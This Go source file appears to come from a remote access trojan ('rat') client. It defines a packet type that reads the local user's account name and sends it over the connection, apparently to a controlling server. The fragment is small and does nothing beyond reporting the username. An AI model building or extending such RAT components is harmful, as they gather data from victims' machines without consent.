package main

import (
	"rat/client/userinfo"
	"rat/common"
)

type Username struct {
	OutgoingPacket
}

func (packet Username) GetHeader() common.PacketHeader {
	return common.UsernameHeader
}

func (packet Username) Write(c *Connection) error {
	u := userinfo.GetUser()

	c.WriteString(u.Username)

	return nil
}
